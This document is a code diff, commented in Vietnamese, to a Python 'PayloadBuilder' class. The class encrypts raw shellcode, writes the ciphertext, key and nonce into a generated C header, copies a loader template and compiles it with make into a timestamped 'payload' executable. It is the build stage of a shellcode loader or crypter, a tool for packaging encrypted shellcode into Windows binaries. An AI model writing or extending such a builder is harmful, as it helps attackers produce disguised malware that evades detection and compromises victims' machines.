@@ -27,63 +27,91 @@ class PayloadBuilder:
         """Chuyển đổi bytes thành chuỗi C++ array: {0x00, 0x01...}"""
         return "{" + ", ".join([f"0x{b:02x}" for b in data]) + "};"
 
+    def _write_payload_header(self, output: dict, build_dir: str):
+        """Sinh payload_data.h chứa toàn bộ encrypted data"""
+        
+        lines = ["#pragma once", "#include <stdint.h>", ""]
+        
+        method = output["method"]
+        ciphertext = output["ciphertext"]
+        key = output.get("key", b"")
+        nonce = output.get("nonce", b"")
+        
+        # Shellcode
+        lines.append(f"unsigned char PAYLOAD[] = {self._format_cpp_array(ciphertext)};")
+        lines.append(f"unsigned int  PAYLOAD_LEN = {len(ciphertext)};")
+        lines.append("")
+        
+        # Key (nếu có)
+        if key:
+            lines.append(f"unsigned char PAYLOAD_KEY[] = {self._format_cpp_array(key)};")
+            lines.append(f"unsigned int  PAYLOAD_KEY_LEN = {len(key)};")
+        else:
+            lines.append("unsigned char PAYLOAD_KEY[] = {};")
+            lines.append("unsigned int  PAYLOAD_KEY_LEN = 0;")
+        lines.append("")
+        
+        # Nonce (nếu có)
+        if nonce:
+            lines.append(f"unsigned char PAYLOAD_NONCE[] = {self._format_cpp_array(nonce)};")
+            lines.append(f"unsigned int  PAYLOAD_NONCE_LEN = {len(nonce)};")
+        else:
+            lines.append("unsigned char PAYLOAD_NONCE[] = {};")
+            lines.append("unsigned int  PAYLOAD_NONCE_LEN = 0;")
+        lines.append("")
+        
+        # Method string (optional, debug only)
+        lines.append(f'const char*   PAYLOAD_METHOD = "{method}";')
+
+        header_path = os.path.join(build_dir, "payload_data.h")
+        with open(header_path, "w") as f:
+            f.write("\n".join(lines))
+
     def build(self):
         # 1. Đọc Shellcode (Stage 1 Init)
         raw_sc = self._read_shellcode()
         if not raw_sc: return None
 
         # 2. Xử lý Mã hóa (Stage 3 Transformation - Build Time)
-        enc_method = self.options.get('encryption', 'none')
+        enc_method = self.options.get('t3', 'none')
         output = apply_encryption(raw_sc, enc_method)
         
         # 3. Chuẩn bị Template C++
-        ciphertext = output["ciphertext"]
-        key = output["key"]
-
-        formatted_sc = self._format_cpp_array(ciphertext)
-        formatted_key = self._format_cpp_array(key)
-        
         try:
-            template_path = os.path.join(PROJECT_ROOT, 'src', 'main.cpp')
-            with open(template_path, 'r', encoding='utf-8') as f:
-                template = f.read()
-                
-            # Thay thế các placeholder
-            # Lưu ý: Placeholder {{DEFINES}} đã bị loại bỏ vì ta dùng cờ biên dịch -D
-            code = template.replace("/*{{SHELLCODE}}*/", formatted_sc) \
-                           .replace("/*{{SHELLCODE_LEN}}*/", str(len(ciphertext))) \
-                           .replace("/*{{KEY}}*/", formatted_key) \
-                           .replace("/*{{KEY_LEN}}*/", str(len(key)))
-                           
-            src_file = os.path.join(BUILD_DIR, 'generated_loader.cpp')
-            with open(src_file, 'w', encoding='utf-8') as f: 
-                f.write(code)
-            
+            os.makedirs(BUILD_DIR, exist_ok=True)
+            os.makedirs(OUTPUT_DIR, exist_ok=True)
+            os.makedirs(os.path.join(PROJECT_ROOT, 'build', 'obj'), exist_ok=True)
+            self._write_payload_header(output, BUILD_DIR)
+
         except Exception as e:
-            self.logger.error(f"Template generation failed: {e}")
+            self.logger.error(f"Header generation failed: {e}")
             return None
 
-        # 4. Chuẩn bị Cờ biên dịch (Lấy từ definitions.py)
-        defines_str = get_defines(self.options)
-        print(defines_str)
-        
-        # 5. Thực thi Make
-        output_name = f"payload_{int(time.time())}.exe"
-        
-        # Clean môi trường
-        subprocess.run(["make", "clean"], cwd=PROJECT_ROOT, capture_output=True)
-        os.makedirs(os.path.join(BUILD_DIR, "obj"), exist_ok=True)
-        
-        # Lệnh build
-        cmd = ["make", "build", 
-               f"SRC={os.path.basename(src_file)}", 
-               f"OUT={output_name}", 
-               f"DEFINES={defines_str}"]
-        
-        self.logger.info(f"Compiling with flags: {defines_str}")
-        
+
+        # 4. Copy main.cpp → build/src/generated_loader.cpp
         try:
-            # Chạy make tại thư mục gốc
+            import shutil
+            src_template = os.path.join(PROJECT_ROOT, 'src', 'main.cpp')
+            src_file     = os.path.join(BUILD_DIR, 'generated_loader.cpp')
+            shutil.copy(src_template, src_file)
+        except Exception as e:
+            self.logger.error(f"Template copy failed: {e}")
+            return None
+
+        # 5. Defines + Make
+        defines_str = get_defines(self.options)
+        output_name = f"payload_{int(time.time())}.exe"
+
+        subprocess.run(["make", "clean"], cwd=PROJECT_ROOT, capture_output=True)
+
+        cmd = ["make", "build",
+               f"SRC={os.path.basename(src_file)}",
+               f"OUT={output_name}",
+               f"DEFINES={defines_str}"]
+
+        self.logger.info(f"Compiling with flags: {defines_str}")
+
+        try:
             subprocess.run(cmd, cwd=PROJECT_ROOT, check=True, capture_output=True)
             full_path = os.path.join(OUTPUT_DIR, output_name)
             self.logger.info(f"Build Success: {full_path}")
